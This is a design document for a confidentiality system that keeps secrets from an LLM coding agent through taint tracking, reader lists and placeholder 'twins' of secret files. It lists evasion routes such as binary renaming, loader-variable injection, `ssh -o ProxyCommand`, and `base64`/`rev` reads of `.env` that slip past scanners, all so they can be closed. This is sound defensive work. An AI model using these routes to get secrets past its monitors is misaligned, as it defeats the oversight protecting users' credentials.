# Confidentiality Plan 10 — flow-based confinement: raw secrets for programs, taint on what they emit

> **Status: BUILT.** Every phase of §8 is built: the structured twin
> (§2.4), the environment mask (§11.4), the wire release (§11.5), the
> policy and stores, the interposer (readers get the raw file, everyone
> else the twin or `EACCES`, by descriptor where no bind can mount), the
> model-context exit in both model proxies, the network and filesystem
> exits, the Inbox hold, the pin write-back, AF_UNIX bindings, the `/proc`
> and `ptrace` clauses, and the read-only dashboard surface. The two spikes
> of §7 were measured before the build (about 25 µs per trapped open; 1 %
> of tool results would mask). Not built, by decision: a dashboard switch
> that writes reader rules, and `mandu secrets reader add` (§8 phase 5).
> [`confidentiality-plan-13-reader-set-labels.md`](./confidentiality-plan-13-reader-set-labels.md)
> (Plan 13) revised parts of this design (per-file output rules, the
> intersection of bindings, the reader-identity checks); each revision is
> marked where it applies.
>
> The direction came from the first live `secrets`-mode battery
> (`protection-modes.md` §8.5, findings 1 and 2: the whole-file twin broke
> every program that parses the file). This doc fixes the model, the
> enforcement per chokepoint, the leak channels it does and does not close,
> and the decisions taken (§11). §10 places it against the sandbox,
> masking, placeholder-and-inject and OS-DIFC families. Figures:
> [`figures/flow-confidentiality.html`](./figures/flow-confidentiality.html)
> (Fig. 1–3 are the design; Fig. 4 puts Claude Code's credential mask and
> nono beside it, with a seven-command example table; see
> [`comparisons.md`](./comparisons.md)).

**Goal:** keep the guarantee of `confidentiality.md` (a registered secret
reaches neither the model nor an unbound destination) while letting the
programs that legitimately need the raw bytes have them. The earlier
mechanism replaced the data for the whole process tree (the whole-file
twin, `confidentiality.md` §7.2): `. ./.env` failed with `command not
found`, `deploy.sh` ran with an empty key, `psql` could not log in, `git
commit -a` committed the placeholder. This plan enforces the guarantee by
*following the data* instead: a process that is allowed to open a secret
file is **tainted** with the file's label, and the taint decides what the
process may emit and where. (Corrected 2026-10-10: the last of those four
is not fixed by following the data. git is a printer (§11.3) and still
reads the twin of a file with no reader list, and the mount layer has no
reader lists at all, so `git commit -a` still records the placeholder in
the user's repository; only the guard with a reader list turns it into a
refusal (§2.4). The launcher now detects it after the session,
`confidentiality.md` §7.2a "A placeholder in your repository".)

**One sentence:** *who may read the raw bytes* is a per-file list; *what a
reader's output becomes* is a per-reader rule; the model is one app that is
never on any list.

---

## 1. Why the twin is the wrong unit

A twin that makes the raw bytes absent from the agent's world is the right
property for the model's own reads. It is the wrong property for every other
consumer: a shell that sources a dotenv, a database client that reads
`~/.pgpass`, an SDK that parses `~/.aws/credentials`, `ssh -i`, `git`
hashing a tracked file. Each reads the file *to use it*, and each gets a
token where it expects structure. A per-command carve-out says nothing
about what the program does with the bytes afterwards; a per-format twin
only serves consumers whose use of the secret is an HTTP header or body a
proxy can rewrite. The structured twin is kept as the **zero-config
baseline** (§2.4; it is what Claude Code ships as `credentials.files`
`mask` with an `extract` pattern, §10); the reader list and the taint are
added on top of it for the consumers a proxy cannot serve.

The observation that replaces it: **the raw bytes are only dangerous once
they leave the process that read them.** The four ways they can leave are
the four chokepoints Mandu already mediates (model context, network,
filesystem, exec). So let the read happen, mark the process, and apply the
label at those four exits. `confidentiality.md` §7.1 states this as the
kernel-tier "one-way valve" and §8 as the conservative rule ("any output of
a process that read a secret path inherits the level read"). This plan
makes both concrete and replaces §7.1's "net XOR secret" with "net only to
the secret's bound destinations", which is what the egress gate already
enforces for symbols.

## 2. The model: two tables (Fig. 1)

### 2.1 Per file: readers and destinations

Every registered secret path carries a `level` and `bindings` (the hosts
the datum may be released to; `arbiter/secret-registry/registry.ts`,
`policy.yaml` `paths[].bindings`). This plan adds one column:

```yaml
paths:
  - path: ~/proj/deploy.token
    level: no-model
    readers: [{ app: deploy, prints: nothing }]
    bindings: [db.internal:5432]
  - path: ~/.aws/credentials
    level: no-model
    readers: [{ app: aws, prints: nothing }]
    bindings: ["*.amazonaws.com"]
```

> **Revised by Plan 13 D8 (12) (2026-10-04).** A listed program reads raw
> only when it is vetted (`ssh`, `ssh-add`, probed not to print a file) or
> its entry carries the human's word, `prints: nothing`; any other listed
> program gets the twin. A printer (`git`, `curl`, `scp`, `psql`,
> `pg_restore`, `cat`, …) or a program that runs code admits nothing,
> `prints: nothing` or not. With no list, a consumer-table program reads
> raw only when vetted. This plan first used `readers: [psql]` as its
> example; under the revision it admits nothing.

- `readers` is **absent by default**. A file with no reader list is served
  to every program as its **structured twin** (§2.4): nobody holds the
  bytes, the values are per-field symbols, and the egress gate releases
  them at the file's `bindings`. A reader list, once written, is
  **exhaustive**: the listed programs get the raw bytes and are tainted,
  everyone else is **denied** (§3.3) unless the entry says `others: twin`.
  The built-in consumer table (§11.3) makes a known consumer a default
  reader of a file with no list (since Plan 13 D8 (12): only a vetted one,
  `ssh` or `ssh-add`; the others get the twin).
- **The LLM's own process is never a reader.** `claude`, `codex` and the
  MCP servers they spawn read the twin. If the agent process were tainted,
  every later reply would be secret. This is the model-context invariant
  restated, not a default a user can flip. (`any-model` files are read
  through the quarantined path or the watermarked in-context read,
  `confidentiality.md` §3.3 and §4, unchanged by this plan.)
- A shell or an interpreter named alone admits nothing (Plan 13 §8
  decision (b)); an interpreter is a reader only together with a pinned
  script (§2.3).
- `bindings` keeps its meaning and gains a second consumer: the network
  exits of a tainted *process*, not only the release of a *symbol*.

### 2.2 Per app: what its output becomes once it is tainted

> **Revised by Plan 13 D3.** A rule is written on the reader entry of one
> file, `paths[].readers: [{ app: deploy, prints: nothing, output: clear }]`, and speaks for
> that (file, binary) pair only. The fold of §3.2 reads one rule per taint
> row, so a process's output is released only when every file it holds
> clears its reader. The program-wide `apps:` table shown below is
> **deprecated**: it still validates, clears nothing, and the validator
> warns. The refusal of the last bullet covers every program that runs
> code (shells, interpreters, launchers such as `find`, `awk`, `env`).

```yaml
apps:
  - app: bash                        # (i)  whole output is secret (the default)
    output: secret
  - app: deploy                      # (ii) output is not secret
    output: clear
  - app: aws                         # (iii) only the matching spans are secret
    output: mask
    mask: ['AKIA[0-9A-Z]{16}', '"SecretAccessKey": "[^"]+"']
```

- **(i) `secret`, the default.** Everything the process writes to
  stdout/stderr after the open is one secret datum at the file's level: the
  tool result reaches the model as `$MDU:nomodel_Exec[…]`; the human sees
  the real text through the reply filter. This is the rule for shells and
  interpreters, whose output can be anything.
- **(ii) `clear`.** The output is not secret: a human statement that *this
  program prints results, not its credential* (`psql` prints rows, `aws s3
  ls` prints bucket names). The network and file exits of the process stay
  bound (§3); only the model-facing stdout is released.
- **(iii) `mask`.** Rule (ii) plus human-written regexes for the spans that
  *are* secret in this program's output format. It is a statement about a
  format, not a leak detector, and the UI says so. It is an expert knob:
  the end-user surface offers one binary choice per program, "the AI may
  see this program's output" (rule (ii) with the value scan).
- **The verbatim-value backstop.** Under (ii) and (iii) the output is also
  scanned for the registered secret *values* (the fingerprint scan of
  `arbiter/policy/egress-fingerprint.ts`, applied at the model boundary). A
  literal hit is symbolized regardless of the rule. It catches the common
  accident (an app echoing its credential, `set -x`, a debug dump); it
  does not catch base64, short substrings or hashes, and the claim is
  scoped accordingly. The scan also matches any line of a multi-line
  secret of `MIN_LINE_FINGERPRINT_LEN` (24) or more characters, and the
  arbiter's `classify` runs it on every tool result the path rules call
  public, whatever the process tree held, raising it to the secret's level
  (Mandu's quarantine tools are exempt). That closes a labeled document
  committed to the workspace's own git repository reaching the model
  through `git diff` (git reads `.git/objects`, so no open of the file and
  no taint; `model-endpoints.md` §1.8 item 1). Short secrets are matched
  as pieces of their value (§11.15), a large or binary file's too, up to a
  bound past which its readers' output is masked whole (§11.18). A line the file's own structured twin
  carries as it is (a `.env` comment) is no line fingerprint (§11.8). A
  result this raise alone made secret registers, of its own long lines,
  only those a secret was found in (and any with a credential shape), so
  its ordinary lines mask nothing later; a call whose tree read a secret,
  or whose result is secret by a path, keeps every line
  ([plan 15 §13.11](./confidentiality-plan-15-prompt-filter.md)).
  Since 2026-10-17 the raise comes with an offer: when the call's own
  evidence holds no secret read, each registered single-line value in the
  result becomes its own symbol and the rest of the result is released,
  after a residue scan for the value encoded, spread or in fragments; any
  doubt masks the result whole as before
  ([backstop-value-only.md](./backstop-value-only.md)).
- **Rules (ii)/(iii) are for leaf programs, never interpreters.** Listing
  `bash` or `node` as `clear` would let any agent-authored script read a
  secret and print it; the loader refuses it.

### 2.3 What "app" means

Inside the agent's world `argv[0]` is a free choice (`cp /bin/cat ./psql`),
so identity is the **resolved executable** of the opening process
(`/proc/<pid>/exe` at the `openat` notification), matched as a **pin**: the
resolved path and the hash of the executable, taken when the reader was
approved or first used (§11.2); a bare name in `policy.yaml` is pinned on
first use and the pin written back beside it. The hash is taken from the
inode the process runs (cached by device, inode, ctime and size), so a path
renamed over after the exec is not vouched for. A rebuilt binary
re-prompts once.

No pin is taken from the agent's world (Plan 13 D8). The guard reports
three facts with every secret open (`reader_identity.rs`), and the arbiter
fails closed on each one it does not get:

- **out of reach** (`exeSystem`): the executable and every directory above
  it are unwritable by the agent's uid (no ownership, group-write or
  world-write in reach; a symlinked component is refused). A first-use pin
  is taken only from such a binary; any other binary of the name asks the
  human (under `secrets-ask` `known` or `always`) or is a non-reader
  (`never`). So the workspace, `/tmp` and the user's own `~/.local/bin`,
  `~/.cargo/bin` or nvm tree never yield a pin silently. An agent running
  as root reaches everything, so nothing is pinned without a prompt.
- **the loader and interpreter environment** (`openerEnv`): variables that
  make a program load or run other code, set to a value the launch did not
  give (by name, never the value): for every program `LD_*`, `GCONV_PATH`,
  `GLIBC_TUNABLES` and OpenSSL's `OPENSSL_CONF`/`_ENGINES`/`_MODULES`; per
  interpreter family `PYTHON*`, `NODE_*`, `PERL*`, `RUBY*`, the shells'
  `BASH_ENV`, `ENV`, `SHELLOPTS`, `PS4`, exported functions, and java's
  `JAVA_TOOL_OPTIONS` and kin. Because a preloaded library can scrub
  `/proc/<pid>/environ`, the guard also reports every executable file
  mapped into the opener that the agent could have written
  (`/proc/<pid>/maps`). Such an opener is no reader, spends no `once`, and
  is never prompted for (the human would be approving the agent's code).
- **what the command line hands it** (`args_code.rs`): for git, ssh, scp,
  sftp, ssh-add, psql, less, sed, tar and rsync, each option that runs code
  the agent chose (`git -c alias.x=…`, `ssh -o ProxyCommand=…`, `tar
  --to-command`, `rsync -e`, a non-plain `GIT_SSH_COMMAND`). Same verdict.
- **trusted ancestors** (`ancestorTrusted`): a `from:` parent (§11.2)
  counts only when it is out of reach and runs with a clean environment;
  the same facts decide a secret socket's reader (`socket_reader_match`).

*An interpreter with its script (Plan 13 §9 R5).* A pin names the
interpreter, not the program it runs, so `readers: [python3]` admits
nothing. An entry may name the script, `{ app: python3, script:
/opt/tools/report.py, scriptSha256?, output? }`. For python, node, the
POSIX shells and perl (not ruby: its per-user gem directory loads code with
no flag to turn it off) the guard reports the script operand by the
family's own option grammar (inline code, a module, standard input, an
interactive shell, an unknown option or a relative path are no script),
whether it is out of reach, its hash, whether the interpreter is isolated
from per-user code (python `-I`/`-s`, node `--no-global-search-paths`, zsh
`-f`), and whether it is traced. The arbiter matches only when every fact
holds (`scriptFactsProblem`), and takes the entry's `output:` only for a
row of that script whose process started no other program.

*Printers admit nothing* (Plan 13 D8): `cat`, `head`, `base64`, `cp`,
`tar`, `jq`, … (`PRINTER_READERS`) in any form, a pin included. The
validator and the dashboard flag a reader that is a shell, interpreter,
launcher (`CODE_RUNNING_READERS`) or printer.

Residuals: ACLs and file capabilities are not read; a program's own config
and argv remain its input (a repository can name a credential helper); a
pinned script that loads code from elsewhere is not caught; code copied
into anonymous memory and unmapped is not seen; a binary the user cannot
read is matched by path alone. The exec gate's `exec-identifier.ts`
answers the same identity question before a command runs; the two agree on
the interpreter list.

### 2.4 The baseline: the structured twin

The whole-file twin is one line, the whole-file symbol. The baseline keeps
the file's **structure** and replaces only the secret **values**, each with
its own symbol:

```
# .env, as the agent's world sees it
PORT=3000
DATABASE_URL='postgres://app:$MDU:nomodel_Read[9bbd].DATABASE_URL.password@db:5432/prod'
STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'
LOG_LEVEL=info
```

A dotenv twin **single-quotes** every masked value, because a shell that
sources the file would expand `$MDU` as a variable (§2.4.1). Values that look benign
(an integer, a boolean, a plain lowercase word such as `production`) stay
raw unless the key's name says secret, so `PORT` and `LOG_LEVEL` keep
working.

#### 2.4.1 A dotenv twin's quoting, and the lines it masks (2026-10-07)

On the first-session walkthrough both agents showed
`STRIPE_KEY='sk_live_…'` for a file whose line reads
`STRIPE_KEY=sk_live_…`. The quotes are the twin's, and they stay where the
user's own form would break the placeholder:

| The user's value | The twin's value | Why |
|---|---|---|
| `'…'` | `'…'`, as written | literal to every loader |
| unquoted | `'…'` | `$MDU` is expanded |
| `"…"` | `'…'` | `$MDU` is expanded |
| `` `…` `` | `'…'` | a shell runs it as a command |

Every loader that expands variables reads `$MDU` in an unquoted or
double-quoted value as a variable that is not set, and the program gets
`:nomodel_Read[9bbd].STRIPE_KEY`, which no egress release recognizes.
Measured: bash `set -a; . ./.env` and `docker compose config` both give
`:nomodel_…` for the unquoted and the double-quoted forms and the
placeholder for the single-quoted one (compose warns that `MDU` is not set);
node's `dotenv` 17.4 gives the placeholder for all three. dotenv-expand
(Next.js, Vite), Ruby's and Go's dotenv and direnv expand `$NAME` the same
way. Single quotes are the one form that every loader, expanding or not,
reads literally, so they are the twin's form. No other spelling works: a
backslash (`\$MDU`) is kept by the loaders that expand nothing, and a quote
around the token alone (`KEY=a'$MDU…'b`) is kept by node's dotenv.

What stays as the user wrote it: a single-quoted value (the line is byte
for byte the user's, the secret aside), `export`, the key, the spacing
around `=` or node's `KEY: value` form, a trailing comment, comments,
blank lines, CRLF line ends, and every line with nothing masked. The
human sees a masked unquoted value with the twin's quotes (the reply
filter resolves the token, not the quotes around it, and in PTY mode the
opening quote is on the screen before the token arrives). Kept by the
maintainer's decision (2026-10-09) over showing the user's own form: the
quotes the user did not write are a visible surprise, a broken value in
an expanding loader is a silent failure.

The parser reads a value the way the loosest loader does, so no part of a
secret stays raw in the twin (each was a raw secret byte before this
change, found on the same walkthrough):

- A value that opens with `'`, `"` or a backquote runs to the quote that
  closes it, a backslash escaping the next character (node's and python's
  dotenv), **across lines**, when only whitespace or a comment follows the
  closing quote. A multi-line private key is one span; before, only its
  first line was masked and its body reached the model.
- A quote never closed, or text after the closing quote (`'ab'cd`): the
  rest of the line before ` #` is the value.
- Keys follow node's grammar (`[\w.-]+`, so `API-KEY=` and `my.key=`), and
  node's `KEY: value` is an assignment.
- A line that is no assignment, blank or comment is masked whole, the bare
  field token in its place (`line<N>`): fail-closed, since node's dotenv
  and a shell read lines this parser does not. The two exceptions hold
  nothing to mask: `set -a` / `set +a` / `set -o allexport`, and a bare
  `export NAME …`. In an `.envrc` a third (2026-10-10), below: direnv's
  built-ins.
- A URL whose text around the password cannot sit inside single quotes (a
  quote, a backslash, a line break) masks the whole value instead of the
  password alone.

**direnv's built-ins in an `.envrc` (2026-10-10).** Masking every command
line hid `use nix`, `layout python` or `PATH_add bin` from the agent, which
then could not tell how the project's environment is built. In a file named
`.envrc` (only there: in a `.env` such a line is no built-in), a line that
is no assignment stays raw when `direnvBuiltinLine`
(`arbiter/policy/secret-extract.ts`) accepts all of it, and is masked whole
otherwise, as before:

- Its first word is one of direnv's stdlib built-ins whose arguments are
  names, paths, layouts or a status message (`DIRENV_BUILTINS`):
  `PATH_add`, `path_add`, `MANPATH_add`, `PATH_rm`, `path_rm`,
  `load_prefix`; `layout` and `layout_<name>` (anaconda, go, julia, node,
  perl, php, pipenv, poetry, pdm, pyenv, python, python2, python3, ruby,
  uv); `use` and `use_<name>` (flake, guix, julia, nix, node, nodenv,
  rbenv, vim); `dotenv`, `dotenv_if_exists`, `source_env`,
  `source_env_if_exists`, `source_up`, `source_up_if_exists`;
  `watch_file`, `watch_dir`; `strict_env`, `unstrict_env`,
  `env_vars_required`; `log_status`, `log_error`; `has`, `expand_path`,
  `find_up`, `direnv_version`, `on_git_branch`. Left out: `fetchurl` and
  `source_url` (a URL is where an access token rides), `direnv_load` and
  `rvm` (they run a command line), and the helpers used inside a command
  substitution (`join_args`, `user_rel_path`, `semver_search`).
- The rest is plain words (a path, a flake reference such as `.#dev`, a
  version, a glob), single- or double-quoted text with no backslash or
  backquote, `$PWD` and `$HOME` (bare, braced or in double quotes), and a
  trailing `# comment`. Any other expansion (`$TOKEN`, `${X:-y}`), a
  command substitution, a redirection, a pipe, `;`, `&&`, `&`, braces, a
  quote never closed or a line continuation masks the line.
- No word, the comment's included, is a URL with a password, a
  secret-named flag (`--token`, `--password=`), a `NAME=` whose name says
  secret, or holds a piece `looksLikeSecretValue` takes (the pieces between
  `/`, `=`, `#`, `:` and `,`, so a path or a flake reference is judged by
  its segments and a base64 secret with a `/` is still seen), and the
  content detector finds no credential format in the line. The cost: an
  argument with a random-looking piece, such as a flake pinned to a
  commit hash, masks the line.

A raw `dotenv .env.local` or `source_env ..` shows a path, never what the
file holds: that file is labelled and twinned as itself. A secret value
repeated on an accepted line is still replaced by its token (§2.4, every
occurrence). What stays masked that a reader might expect raw: a built-in
with a `$` other than `$PWD` / `$HOME`, `if has nix; then use nix; fi`
(chaining), and `fetchurl`.

Tests: `arbiter/test/unit/dotenv-twin-quoting.test.ts` (every form, the
leaks above, the `.envrc` allow-list: accepted lines, chaining,
substitution, key formats, export lines unchanged),
`tests/stack/dotenv-twin-quoting.test.ts` (a real arbiter's twin, sourced
by bash, resolved on the human plane; an `.envrc` twin whose built-ins are
the user's own lines and whose other commands are masked).

- **Extraction is by shape, then by pattern.** The catalog names the shapes
  (`secret-catalog.ts` `SECRET_BASENAME_SHAPES`); each has a default
  extractor (`arbiter/policy/secret-extract.ts`): dotenv and INI take the
  value side of every assignment, `.pgpass` the last colon field, `.netrc`
  the `password` token, npmrc, YAML and JSON by key name, URL passwords as
  sub-fields, private keys the whole file. A `paths[]` entry may override
  with `extract: '<regex with one capturing group>'`, the contract of
  Claude Code's `extract`. A file that matches no shape and has no pattern,
  is not UTF-8 text, or exceeds a size floor gets the whole-file twin. A
  file of a known shape in which the extractor finds no secret value also
  gets the whole-file twin, except the three EXHAUSTIVE shapes of §11.13
  (`~/.ssh/config`, `pip.conf`, git's credential store), whose twin is then
  the file's own text, and which reaches the model as that text (§11.13,
  "A config with no secret", 2026-10-17). The whole-file twin ends as the
  file does (§11.13).
- **The structured twin applies to a person-labelled file too, and there
  it is a known gap** (security gap, confirmed end to end and documented
  as interim 2026-10-16; plan 16 §1.2). The decision is by shape and
  spans, not by who labelled the file: a JSON, YAML, TOML, INI or XML
  file a person labels, with one key that looks secret, gets the per-key
  twin, and every value under any other key (`ssn`, `wages` beside
  `password`) reaches the model raw, through Read of the twin and through
  a command that does not name the path. This was written for credential
  files the catalog names, where the unmasked values are configuration;
  for a file a person labels as a whole it breaks the invariant. The
  planned fix is plan 16 §3 (every value of a labelled data file a
  symbol); a whole-file twin for every non-catalog label was prototyped
  and not taken, since it breaks the labelled MCP-config flow below.
  Until then: `extract:` with a pattern matching every value, or a file of
  no known shape (whole-file twin); `mandu why` shows which form applies.
  Pinned as a KNOWN LIMIT, not an oracle:
  `tests/stack/labelled-data-file-twin.test.ts`. Detail:
  secret-discovery.md §2.5.
- **List items** (2026-10-09, `listItemSpans`). JSON, YAML and TOML judge
  the string items of a list too, which have no key: a URL's password, a
  detector format, the item after a secret-named flag, the value of a
  secret-named `--flag=`, `NAME=` or `Header:`, the same inside an item
  that holds a command line (read as shell words since the third review,
  2026-10-10, so a switch before a secret flag no longer hides it), and
  every item of a list under a secret-looking key
  (`"args": ["--api-key", "$MDU:nomodel_Read[9bbd].args.3"]`). Before, a
  labelled `.mcp.json` with an `env` block twinned with every `args` value
  raw. They only add to a file whose keys gave a span: a file with none
  stays the whole-file twin, so recognizing more never shows more. Spans
  are on the file's own text (an escape is masked with its character), so
  the twin keeps parsing; a placeholder in a plain YAML flow item is
  written single-quoted (`wrap`, as dotenv's), since `[` and `]` are flow
  indicators there (2026-10-10). A list that never closes or nests past 64
  makes the whole-file twin. Rules and limits: secret-discovery.md §2.5.
  `mandu why` and the dashboard's Why say what a registration makes of the
  file as it is (`twinFormOf`, the `whyPath` `twin` field: the shape and
  how many values it masks, the file's own text, or the whole-file twin);
  they inferred it from the path until then. `whyPath` is reachable from
  the data socket, so it is bounded (`arbiter/ipc/why-preview.ts`): the
  file is checked before it is opened (`lstat`, and `stat` of a link's
  target: only a regular file; a FIFO or a device is never opened), at
  most `WHY_MAX_BYTES` (256 KiB) of it is read and checked again on the
  descriptor, an answer is remembered by the hash of that text, and on the
  data socket texts not remembered spend a budget of 1 MiB per 10 s (the
  dashboard's human plane has its own, unbudgeted; the extraction costs up
  to about 1 µs a byte on the arbiter's one event loop: an agent-written
  7 MB YAML took 3.5 s a call). Every extractor walk is linear
  (secret-discovery.md §2.5). A file not read gets no `twin` and the
  hedged words.
- **Every occurrence of a value is its symbol** (2026-10-09,
  `renderStructuredTwin`). The twin replaces a secret value wherever the
  file repeats it outside its own span, a comment
  (`# rotated from sk_live_… last week`) or another value equal to it, by
  the same token, unquoted. Before, only the value's own span was
  replaced: the comment reached the twin verbatim (no leak, since the
  value backstop matched it and masked the whole Read, but no per-key
  view either). A value of 8 or more characters (the fingerprint floor) is
  replaced wherever it stands; a shorter one only where it stands as a
  word of its own, since `4821` inside `48210` or `ab` inside `CRAB_URL`
  does not identify it and replacing it there would break the twin's keys
  (the twin's release rules refuse a Read or a `cat` that carries such a
  line, which the path rule then masks whole: fail-closed; see "A glued
  short value" below: until 2026-10-17 only a line of 24 or more
  characters, the line floor, was caught). Where two values overlap, both tokens are written
  and no byte of either stays. An encoded value's own text (npm's base64
  `_password`) is replaced by the token in that encoding. Cost: a
  non-secret value equal to a secret one (`ENV=production` beside
  `PASSWORD=production`) reads as the token in the twin. A span that
  MERGED several secrets (an overlap union, `--api-key key=https://u:PW@h`, or
  one placeholder over a YAML flow item, two secrets in it or the whole
  item when its text holds a quote or a backslash) keeps each as a part
  (`SecretSpan.parts`, 2026-10-10): its own value is the covered text, so
  each part's secret is replaced by the part's own token, and the registry
  mints each part a field row (in no placeholder of the twin, held by the
  value backstop, never bound to a wire host). Before, a copy of such a
  secret under an ordinary key or in a comment stayed raw in the twin the
  model reads (`token: …` / `note: B` / `args: [sh, -c, env API_KEY=A tool
  --token B]` kept `note: B`). Tests:
  `arbiter/test/unit/dotenv-twin-quoting.test.ts`,
  `arbiter/test/component/twin-line-fingerprint.test.ts`,
  `arbiter/test/unit/secret-extract-lists.test.ts` and
  `twin-line-fingerprint.test.ts` (merged parts),
  `tests/stack/agent-read-twin.test.ts`,
  `tests/stack/labelled-mcp-config-twin.test.ts` (step 7).
- **The credential belt: a credential anywhere in the file is a symbol**
  (2026-10-17, P0 security fix, `withCredentialBelt` in
  `arbiter/policy/secret-extract.ts`). Found by an adversarial review: the
  shape rules mask what a program reads as a secret (a secret-named key's
  value, a URL's password), and a credential anywhere else stayed raw in
  the twin. A `.env` with a commented-out old key
  (`# OLD_STRIPE_KEY=sk_live_51Old…`) twinned with the key whole; every
  program is served the twin and Read shows it, and the value backstop
  matches verbatim bytes only, so a command in a clean tree that does not
  name the file (`base64 ./.e*`, `cut -c9- ./.e*`, `rev`, `fold`) handed the
  model the key in a form nothing recognized (0 hits for base64, reversed,
  split across lines, or without its `sk_live_`). The value backstop already
  held the key as a piece of the file (§11.15); the generator did not mask
  it. Now every structured twin (a shape that found a span, or an
  exhaustive shape's own-text twin, which then becomes structured) also
  masks, with the **same detectors the value backstop uses for a
  registered file's pieces** (no fork):
  - every credential-shaped span `locateSecretShapes` finds anywhere in the
    file, comment or not: a vendor key (`sk_live_`, `ghp_`, `AKIA…`,
    `glpat-`, `xox…`, …), a private-key block, a URL's password, a
    credential assignment's value;
  - in a comment, every bare token that reads as a credential
    (`locateBareSecretTokens`, the one `bareSecretTokens` uses): no program
    reads a comment, so masking a word there costs no parser anything. A
    comment is read by the shape's own grammar (`COMMENT_GRAMMARS`,
    `commentBodies`), whole-line or trailing (review of !1621: the first
    build saw whole-line comments only, so `DEBUG=1 # backup 7f3a…` and
    `host: db # old 7f3a…` stayed raw): dotenv and YAML take ` #` after a
    blank and outside quotes (a quote opens only where a value can start,
    so `don't` is no quote), and YAML's block scalars (`key: |` and the
    more indented lines under it) are data, `#` lines included; INI,
    `.npmrc` and `pip.conf` take ` #` or ` ;`; TOML takes `#` outside a
    string, JSONC `//` and a slash-star block (across lines) outside a
    string; `.pgpass`, `.netrc`,
    `~/.ssh/config` and git's store take whole-line `#` only; XML and an
    `extract:` pattern none. A UTF-8 byte order mark before the first line
    is set aside. A quote still open at a line's end proves nothing (second
    review of !1621: `NOTE= "abc # old …` is the value `"abc` to the dotenv
    extractor, and a quote-aware reading missed the comment): that line is
    read again with every quote an ordinary character, and a comment either
    reading finds counts.

  Each becomes a field of the file, named by the assignment right before it
  (`# OLD_STRIPE_KEY=sk_live_…` gives `cred.OLD_STRIPE_KEY`) or else by
  its kind (`cred.stripe_key`, `cred.token`), repeats `__2`, `__3` in file
  order. Never by its line number (review of !1621: a line added above
  renamed it under a `values:` entry), and never by a hash of the value (a
  short hash of a guessable password checks a guess). The field
  the registry mints it a row, so the value backstop, the egress tripwire,
  the bindings and a copy of it elsewhere in the file treat it as any other
  value. Only what the shape left raw is added (a belt span never cuts a
  shape's span), a copy of a value the shape found keeps that value's own
  token, and a bare token that overlaps a detector span keeps only what
  still reads as a credential on its own, so the comment reads
  `# OLD_STRIPE_KEY=$MDU:nomodel_Read[9bbd].cred.OLD_STRIPE_KEY`. In a dotenv,
  a key in a known format inside a value the value rules keep raw (a URL
  with no password, `?key=sk_live_…`) masks the whole value, single-quoted
  (§2.4.1); the comment's token is inert, so `. ./.env` is unchanged (no
  migration). A file whose shape found no secret value keeps the
  whole-file twin (recognizing more never shows more). More than 1,000
  detector hits make the whole-file twin; the walk is linear. What the
  belt does NOT reach: a secret with no detector format, outside a
  comment, under a key that does not look secret (`notes: hunter2`), and
  every other value of a person-labelled data file (the KNOWN LIMIT above,
  plan 16).

  **A comment's credential is bound nowhere** unless a label's `values:`
  entry names its field (current-bindings.ts, `SecretSpan.comment`). The
  argument: a label's `bindings` speak for the values programs read, and
  no program sends a comment, so the only way the token reaches a request
  is the model writing an old key into a command. A commented-out key is
  usually a rotated one the human never thought of when binding the file,
  possibly another vendor's (`# old: ghp_…` in a file bound to
  `api.stripe.com`): fail-closed, it is released nowhere, and the egress
  tripwire trips on it even at the file's own host. A human who wants it
  usable writes `values: { "cred.OLD_STRIPE_KEY": { bindings: [...] } }`.
  The whole file, as a raw holder holds it, still goes where the label sends
  the whole file. One consequence, by design (review of !1621): a send of
  the whole file's twin (an upload, `curl --data-binary @.env`) carries
  every field token, and a comment's field is bound nowhere, so uploading
  the file to its own bound host now asks (approval) where it was released
  before. The human answers once, or binds the field under `values:`. npm's wire-twin test passes over a comment's span (npm
  never reads it), so a HOME `.npmrc` with a commented-out old token is
  still served as its twin. Tests:
  `arbiter/test/unit/twin-comment-credentials.test.ts` (every shape, the
  reviewer's encodings, bindings, npm, `. ./.env`, the linear walk),
  `arbiter/test/component/twin-comment-credentials.test.ts`,
  `tests/stack/twin-comment-credentials.test.ts` (the oracle: Read, `cat`,
  and `base64`/`cut`/`rev`/`fold` of `./.e*` through the real proxy carry
  the key in no encoding).
- **A glued short value** (2026-10-17). A value under 8 characters is left
  glued inside a longer word (`MODE=owlish` beside `DB_PASS2=owl`) so the
  twin keeps every program's value right (`MODE` is `owlish`, not a token
  plus `ish`, and a 1-character password does not shred every `1` in the
  file). Its line is no longer released raw: the twin's release rules (the
  read-twin rule `isStructuredTwinText`, the structured exec-output rule
  `structuredTwinExecOutputPath`, the key listing's forms) refuse a text
  that holds one of THIS file's secret texts, the twin's own `$MDU:` tokens
  set aside (egress-fingerprint.ts `holdsSecretText`); the path rule then
  masks it whole. A Read of the other lines (offset/limit), a `grep` of
  another line and a key listing (`MODE` alone, below) pass. Before, such a
  line under the 24-character line floor was no piece, and the structured
  rule and a Read released it. Chosen over replacing the glued occurrence
  in the twin, which would hand every program a broken value. The first
  build of this fix made the line a piece of the file instead, which the
  value backstop, the egress tripwire and the prompt filter apply to every
  text: with `DB_PASS=dev`, `NODE_ENV=development` masked an unrelated
  `package.json` and a Dockerfile (review of !1621); the refusal is local
  to the twin's own renderings. **Known limit**: an
  ENCODED copy of the twin by a command that does not name the file
  (`base64 ./.e*`) still carries the glued word; the value (under 8
  characters, inside a word that does not mark it) is not identifiable
  there, and closing it would mean breaking the program's value.
- **Every value is a symbol** (`registerSecret` mints one per captured
  span, origin = path + key), so the per-symbol egress gate releases each
  at the file's `bindings` and the fingerprint scan holds each value. The
  reply filter shows the human the real values.
- **What it buys with nobody tainted:** `. ./.env` works and every later
  `$STRIPE_KEY` is a symbol; a script that lists variable names lists them;
  `curl -H "Authorization: Bearer $STRIPE_KEY" https://api.stripe.com` is
  released at the wire **where the proxy can see the body** (plain HTTP, or
  TLS inspection, on by default, §11.5). What it cannot buy is any consumer
  that needs the bytes locally: `psql` on the Postgres wire, `ssh -i`, a
  SigV4 signature, `gpg`. Those are what `readers` is for.
- **`git add -A` under the baseline** commits the structured twin. Symbols
  are opaque, so the remote receives tokens, not values: a utility defect,
  not a leak. The `[mandu:secret]` note (§3.3) fires on the read, and a
  user who wants the loud failure writes `readers: []` (an empty,
  exhaustive list: everyone denied). (Corrected 2026-10-10: no note
  follows the commit, since the `twin:` note fires only when a tool's
  output is itself twin text (§5, §11.8) and `git add` / `git commit`
  print none. The loud failure needs both the guard and a reader list:
  in the mount layer, where no interposer reads the list, and for any file
  without one, git reads the twin and the commit silently records the
  placeholder in the user's repository. The launcher says so after the
